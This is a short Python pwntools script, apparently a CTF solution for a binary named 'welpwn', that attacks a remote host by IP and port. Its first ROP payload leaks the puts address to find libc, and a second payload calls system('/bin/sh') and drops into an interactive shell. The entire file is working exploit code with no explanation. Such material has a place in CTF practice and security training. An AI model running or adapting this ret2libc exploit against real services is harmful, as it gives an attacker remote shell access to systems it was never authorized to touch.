from pwn import*
from LibcSearcher import*
p = remote('111.198.29.45',46310)
context.log_level = 'debug'
#p = process('welpwn')
elf = ELF('welpwn')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = 'U'*0x18 + p64(0x40089C) +p64(0x4008A3) + p64(puts_got) + p64(puts_plt+4) +p64(0x4007CD)
p.recvuntil('Welcome to RCTF\n')
p.sendline(payload)
p.recvuntil('\x9C\x08\x40')
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
binsh_addr = libcbase + libc.dump('str_bin_sh')
system_addr = libcbase + libc.dump('system')
payload_II = 'U'*0x18 + p64(0x40089C)+ p64(0x4008A3) + p64(binsh_addr) + p64(system_addr) +p64(0x4007CD)
p.sendline(payload_II)
p.interactive()
